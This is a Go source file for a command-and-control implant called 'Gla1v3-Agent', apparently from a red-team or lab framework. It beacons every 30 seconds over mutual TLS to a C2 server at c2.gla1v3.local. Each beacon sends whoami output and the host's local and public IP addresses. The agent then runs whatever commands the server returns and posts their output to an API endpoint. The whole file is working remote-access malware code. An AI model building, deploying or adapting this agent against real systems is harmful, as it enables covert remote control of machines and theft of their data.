package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// Build-time configuration (injected via -ldflags)
var (
	BeaconInterval = "30s" // Default beacon interval
	C2Server       = "c2.gla1v3.local:4443" // Default C2 server
)

// executeTask runs a task and sends the result back to C2
func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args []string) {
	log.Printf("Executing task %s: %s %v", taskID, cmd, args)
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	var result string
	var taskErr string
	status := "completed"
	
	// Execute the command
	execCmd := exec.CommandContext(ctx, cmd, args...)
	output, err := execCmd.CombinedOutput()
	
	if err != nil {
		taskErr = err.Error()
		status = "failed"
		log.Printf("Task %s failed: %v", taskID, err)
	} else {
		result = string(output)
		if len(result) > 4096 {
			result = result[:4096] + "...(truncated)"
		}
		log.Printf("Task %s completed successfully", taskID)
	}
	
	// Send result back to C2
	resultPayload := map[string]interface{}{
		"result": result,
		"error":  taskErr,
		"status": status,
	}
	
	resultBody, _ := json.Marshal(resultPayload)
	
	// Build result URL - replace /beacon with task result endpoint
	resultURL := strings.Replace(c2URL, "/beacon", fmt.Sprintf("/api/agents/%s/tasks/%s/result", agentID, taskID), 1)
	// Convert c2.gla1v3.local to api.gla1v3.local
	resultURL = strings.Replace(resultURL, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
	
	resultReq, _ := http.NewRequest("POST", resultURL, bytes.NewReader(resultBody))
	resultReq.Header.Set("Content-Type", "application/json")
	
	// Use a plain HTTPS client for API endpoint (not mTLS for results)
	apiClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				RootCAs:    client.Transport.(*http.Transport).TLSClientConfig.RootCAs,
				ServerName: "api.gla1v3.local",
				MinVersion: tls.VersionTLS12,
			},
		},
		Timeout: 10 * time.Second,
	}
	
	resultResp, err := apiClient.Do(resultReq)
	if err != nil {
		log.Printf("Failed to send task result: %v", err)
		return
	}
	defer resultResp.Body.Close()
	
	log.Printf("Task result sent: %s", resultResp.Status)
}

func main() {
	// Cert paths (configurable)
	// Resolve cert/key pair. Prefer env vars; otherwise try common repo filenames so a
	// fresh clone + `generate_session_certs.sh` will be found without extra configuration.
	certEnv := os.Getenv("AGENT_CERT_PATH")
	keyEnv := os.Getenv("AGENT_KEY_PATH")

	tryPairs := [][]string{}
	if certEnv != "" && keyEnv != "" {
		tryPairs = append(tryPairs, []string{certEnv, keyEnv})
	}
	// repo-local candidates (relative to agents-go)
	tryPairs = append(tryPairs, [][]string{
		{"../certs/agent-client.crt", "../certs/agent-client.key"},
		{"../certs/agent.crt", "../certs/agent.key"},
		{"../certs/server.crt", "../certs/server.key"},
	}...)

	var cert tls.Certificate
	var loadedCertPath, loadedKeyPath string
	var loadErr error
	attempted := []string{}
	for _, p := range tryPairs {
		attempted = append(attempted, p[0]+"|"+p[1])
		if _, err := os.Stat(p[0]); err != nil {
			continue
		}
		if _, err := os.Stat(p[1]); err != nil {
			continue
		}
		cert, loadErr = tls.LoadX509KeyPair(p[0], p[1])
		if loadErr == nil {
			loadedCertPath = p[0]
			loadedKeyPath = p[1]
			break
		}
	}
	if loadErr != nil {
		log.Fatalf("Failed to load any agent cert/key pair. Attempts: %v. Last error: %v", attempted, loadErr)
	}
	log.Printf("Loaded agent cert/key: %s , %s", loadedCertPath, loadedKeyPath)

	// 2. Load CA so we trust the server (fatal if missing)
	caPath := os.Getenv("AGENT_CA_PATH")
	if caPath == "" {
		caPath = "../certs/ca.crt"
	}

	caCert, err := os.ReadFile(caPath)
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatal("Failed to append CA cert to pool")
	}

	// Server names
	serverName := os.Getenv("AGENT_SERVER_NAME")
	if serverName == "" {
		serverName = "c2.gla1v3.local"
	}
	apiServerName := os.Getenv("AGENT_API_SERVER_NAME")
	if apiServerName == "" {
		apiServerName = "api.gla1v3.local"
	}

	// 3. mTLS config (required by default)
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   serverName,
		MinVersion:   tls.VersionTLS12,
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   10 * time.Second,
	}

	// Separate TLS config for API (whoami) requests: trust same CA but use API servername
	// API TLS: also present client cert for mTLS to API
	apiTLS := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   apiServerName,
		MinVersion:   tls.VersionTLS12,
	}

	whoamiClient := &http.Client{
		Transport: &http.Transport{TLSClientConfig: apiTLS},
		Timeout:   6 * time.Second,
	}

	whoamiToken := os.Getenv("AGENT_WHOAMI_TOKEN")

	// 4. Beacon loop with whoami execution and JSON POST
	agentID := os.Getenv("AGENT_NAME")
	if agentID == "" {
		agentID = "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())
	}

	// Use build-time configuration (can be overridden by env vars)
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://" + C2Server + "/beacon"
	}
	
	beaconInterval, err := time.ParseDuration(BeaconInterval)
	if err != nil {
		log.Printf("Invalid BeaconInterval '%s', using default 30s", BeaconInterval)
		beaconInterval = 30 * time.Second
	}
	
	// Env var can override build-time config
	if v := os.Getenv("BEACON_INTERVAL"); v != "" {
		if iv, err := time.ParseDuration(v); err == nil {
			beaconInterval = iv
		}
	}

	// Limits
	const cmdTimeout = 3 * time.Second
	const maxOutput = 2048

	// Helper to get local IP address
	getLocalIP := func() string {
		ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
		defer cancel()
		
		var cmd *exec.Cmd
		// Try OS-specific commands
		if _, err := exec.LookPath("ipconfig"); err == nil {
			// Windows
			cmd = exec.CommandContext(ctx, "ipconfig")
		} else if _, err := exec.LookPath("ip"); err == nil {
			// Linux
			cmd = exec.CommandContext(ctx, "ip", "addr", "show")
		} else {
			return ""
		}
		
		out, err := cmd.Output()
		if err != nil {
			return ""
		}
		
		// Parse output for IPv4 addresses (skip localhost)
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			// Windows: "IPv4 Address. . . . . . . . . . . : 192.168.1.100"
			if strings.Contains(line, "IPv4 Address") {
				parts := strings.Split(line, ":")
				if len(parts) >= 2 {
					ip := strings.TrimSpace(parts[1])
					if !strings.HasPrefix(ip, "127.") {
						return ip
					}
				}
			}
			// Linux: "inet 192.168.1.100/24"
			if strings.HasPrefix(line, "inet ") && !strings.Contains(line, "127.0.0.1") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					ip := strings.Split(parts[1], "/")[0]
					if !strings.HasPrefix(ip, "127.") {
						return ip
					}
				}
			}
		}
		return ""
	}

	seq := 0
	for {
		seq++

		// Run whoami with timeout
		ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
		cmd := exec.CommandContext(ctx, "whoami")
		outBytes, err := cmd.Output()
		cancel()

		output := ""
		errStr := ""
		if err != nil {
			// include stderr if possible
			if ee, ok := err.(*exec.ExitError); ok {
				errStr = strings.TrimSpace(string(ee.Stderr))
			} else {
				errStr = err.Error()
			}
			log.Printf("whoami failed: %v", err)
		}
		if len(outBytes) > 0 {
			output = strings.TrimSpace(string(outBytes))
			if len(output) > maxOutput {
				output = output[:maxOutput] + "...(truncated)"
			}
		}

		// Get local IP address
		localIP := getLocalIP()

		// Build structured payload
		payload := map[string]interface{}{
			"agent_id": agentID,
			"seq":      seq,
			"output":   output,
			"error":    errStr,
			"ts":       time.Now().UTC().Format(time.RFC3339),
		}
		
		if localIP != "" {
			payload["localIp"] = localIP
		}

		// Attempt to learn public IP via secure whoami endpoint on the API
		publicIP := ""
		if whoamiToken != "" {
			func() {
				req, _ := http.NewRequest("GET", "https://api.gla1v3.local/whoami", nil)
				req.Header.Set("Authorization", "Bearer "+whoamiToken)
				req.Header.Set("User-Agent", "Gla1v3-Agent/0.1 whoami")
				resp, err := whoamiClient.Do(req)
				if err != nil {
					log.Printf("whoami request failed: %v", err)
					return
				}
				defer resp.Body.Close()
				if resp.StatusCode != 200 {
					log.Printf("whoami non-200: %s", resp.Status)
					return
				}
				var j struct {
					IP string `json:"ip"`
				}
				if err := json.NewDecoder(resp.Body).Decode(&j); err != nil {
					log.Printf("whoami decode failed: %v", err)
					return
				}
				if j.IP != "" {
					publicIP = j.IP
					log.Printf("whoami -> publicIp: %s", j.IP)
				}
			}()
		}
		
		// Fallback: try external IP services if whoami didn't work
		if publicIP == "" {
			for _, ipService := range []string{
				"https://api.ipify.org?format=text",
				"https://icanhazip.com",
				"https://ifconfig.me/ip",
			} {
				func() {
					ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
					defer cancel()
					req, _ := http.NewRequestWithContext(ctx, "GET", ipService, nil)
					req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
					
					// Use default HTTP client without mTLS for public services
					plainClient := &http.Client{Timeout: 5 * time.Second}
					resp, err := plainClient.Do(req)
					if err != nil {
						return
					}
					defer resp.Body.Close()
					if resp.StatusCode != 200 {
						return
					}
					var buf bytes.Buffer
					if _, err := buf.ReadFrom(resp.Body); err != nil {
						return
					}
					ip := strings.TrimSpace(buf.String())
					if ip != "" && len(ip) < 50 { // sanity check
						publicIP = ip
						log.Printf("External IP service -> publicIp: %s", ip)
					}
				}()
				if publicIP != "" {
					break
				}
			}
		}
		
		if publicIP != "" {
			payload["publicIp"] = publicIP
		}

		bodyBytes, jerr := json.Marshal(payload)
		if jerr != nil {
			log.Printf("Failed to marshal beacon payload: %v", jerr)
			time.Sleep(beaconInterval)
			continue
		}

		req, rerr := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
		if rerr != nil {
			log.Printf("Failed to create request: %v", rerr)
			time.Sleep(beaconInterval)
			continue
		}
		req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Agent-ID", agentID)

		resp, derr := client.Do(req)
		if derr != nil {
			log.Printf("Beacon POST failed: %v", derr)
		} else {
			log.Printf("Beacon POST -> %s | Agent-ID: %s | seq=%d", resp.Status, agentID, seq)
			
			// Check for tasks in response
			var taskResp struct {
				Tasks []struct {
					ID   string   `json:"id"`
					Cmd  string   `json:"cmd"`
					Args []string `json:"args"`
				} `json:"tasks"`
			}
			
			if err := json.NewDecoder(resp.Body).Decode(&taskResp); err == nil && len(taskResp.Tasks) > 0 {
				log.Printf("Received %d tasks from C2", len(taskResp.Tasks))
				
				// Execute each task
				for _, task := range taskResp.Tasks {
					go executeTask(client, c2URL, agentID, task.ID, task.Cmd, task.Args)
				}
			}
			resp.Body.Close()
		}

		time.Sleep(beaconInterval)
	}
}
